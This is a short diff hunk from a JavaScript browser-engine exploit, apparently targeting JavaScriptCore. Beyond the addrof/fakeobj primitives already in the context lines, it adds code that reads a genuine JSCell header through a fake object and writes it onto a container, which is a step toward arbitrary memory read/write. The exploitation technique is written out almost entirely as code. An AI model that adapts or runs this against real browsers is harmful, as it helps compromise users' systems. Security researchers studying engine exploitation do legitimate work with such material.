@@ -498,6 +498,11 @@ for (var i = 0; i < 1000; ++i) {
     var hax = fakeobj(addrof(container) + 0x10);
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
+    print("now lets steal a real JSCellHeader")
+    // Can now simply read a legitimate JSCell header and use it.
+    var js_header = hax[0];
+    container.header = js_header; 
+    print("Stolen Real Cell Header: " + js_header) 
     /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
